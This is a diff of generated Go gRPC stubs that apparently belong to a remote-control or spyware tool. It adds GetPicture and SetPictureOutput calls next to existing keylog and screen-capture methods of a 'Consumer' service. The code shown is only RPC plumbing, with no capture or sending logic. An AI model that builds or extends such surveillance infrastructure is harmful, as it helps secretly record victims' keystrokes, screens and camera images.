@@ -31,6 +31,8 @@ type ConsumerClient interface {
 	SetKeylogOutput(ctx context.Context, in *KeylogOutput, opts ...grpc.CallOption) (*Void, error)
 	GetScreen(ctx context.Context, in *ClientDataRequest, opts ...grpc.CallOption) (*ScreenData, error)
 	SetScreenOutput(ctx context.Context, in *ScreenOutput, opts ...grpc.CallOption) (*Void, error)
+	GetPicture(ctx context.Context, in *ClientDataRequest, opts ...grpc.CallOption) (*PictureData, error)
+	SetPictureOutput(ctx context.Context, in *PictureOutput, opts ...grpc.CallOption) (*Void, error)
 }
 
 type consumerClient struct {
@@ -145,6 +147,24 @@ func (c *consumerClient) SetScreenOutput(ctx context.Context, in *ScreenOutput, 
 	return out, nil
 }
 
+func (c *consumerClient) GetPicture(ctx context.Context, in *ClientDataRequest, opts ...grpc.CallOption) (*PictureData, error) {
+	out := new(PictureData)
+	err := c.cc.Invoke(ctx, "/pb.Consumer/GetPicture", in, out, opts...)
+	if err != nil {
+		return nil, err
+	}
+	return out, nil
+}
+
+func (c *consumerClient) SetPictureOutput(ctx context.Context, in *PictureOutput, opts ...grpc.CallOption) (*Void, error) {
+	out := new(Void)
+	err := c.cc.Invoke(ctx, "/pb.Consumer/SetPictureOutput", in, out, opts...)
+	if err != nil {
+		return nil, err
+	}
+	return out, nil
+}
+
 // ConsumerServer is the server API for Consumer service.
 // All implementations must embed UnimplementedConsumerServer
 // for forward compatibility
@@ -158,6 +178,8 @@ type ConsumerServer interface {
 	SetKeylogOutput(context.Context, *KeylogOutput) (*Void, error)
 	GetScreen(context.Context, *ClientDataRequest) (*ScreenData, error)
 	SetScreenOutput(context.Context, *ScreenOutput) (*Void, error)
+	GetPicture(context.Context, *ClientDataRequest) (*PictureData, error)
+	SetPictureOutput(context.Context, *PictureOutput) (*Void, error)
 	mustEmbedUnimplementedConsumerServer()
 }
 
@@ -191,6 +213,12 @@ func (UnimplementedConsumerServer) GetScreen(context.Context, *ClientDataRequest
 }
 func (UnimplementedConsumerServer) SetScreenOutput(context.Context, *ScreenOutput) (*Void, error) {
 	return nil, status.Errorf(codes.Unimplemented, "method SetScreenOutput not implemented")
+}
+func (UnimplementedConsumerServer) GetPicture(context.Context, *ClientDataRequest) (*PictureData, error) {
+	return nil, status.Errorf(codes.Unimplemented, "method GetPicture not implemented")
+}
+func (UnimplementedConsumerServer) SetPictureOutput(context.Context, *PictureOutput) (*Void, error) {
+	return nil, status.Errorf(codes.Unimplemented, "method SetPictureOutput not implemented")
 }
 func (UnimplementedConsumerServer) mustEmbedUnimplementedConsumerServer() {}
 
@@ -370,6 +398,42 @@ func _Consumer_SetScreenOutput_Handler(srv interface{}, ctx context.Context, dec
 	return interceptor(ctx, in, info, handler)
 }
 
+func _Consumer_GetPicture_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
+	in := new(ClientDataRequest)
+	if err := dec(in); err != nil {
+		return nil, err
+	}
+	if interceptor == nil {
+		return srv.(ConsumerServer).GetPicture(ctx, in)
+	}
+	info := &grpc.UnaryServerInfo{
+		Server:     srv,
+		FullMethod: "/pb.Consumer/GetPicture",
+	}
+	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
+		return srv.(ConsumerServer).GetPicture(ctx, req.(*ClientDataRequest))
+	}
+	return interceptor(ctx, in, info, handler)
+}
+
+func _Consumer_SetPictureOutput_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
+	in := new(PictureOutput)
+	if err := dec(in); err != nil {
+		return nil, err
+	}
+	if interceptor == nil {
+		return srv.(ConsumerServer).SetPictureOutput(ctx, in)
+	}
+	info := &grpc.UnaryServerInfo{
+		Server:     srv,
+		FullMethod: "/pb.Consumer/SetPictureOutput",
+	}
+	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
+		return srv.(ConsumerServer).SetPictureOutput(ctx, req.(*PictureOutput))
+	}
+	return interceptor(ctx, in, info, handler)
+}
+
 // Consumer_ServiceDesc is the grpc.ServiceDesc for Consumer service.
 // It's only intended for direct use with grpc.RegisterService,
 // and not to be introspected or modified (even as a copy)
@@ -408,6 +472,14 @@ var Consumer_ServiceDesc = grpc.ServiceDesc{
 		{
 			MethodName: "SetScreenOutput",
 			Handler:    _Consumer_SetScreenOutput_Handler,
+		},
+		{
+			MethodName: "GetPicture",
+			Handler:    _Consumer_GetPicture_Handler,
+		},
+		{
+			MethodName: "SetPictureOutput",
+			Handler:    _Consumer_SetPictureOutput_Handler,
 		},
 	},
 	Streams: []grpc.StreamDesc{
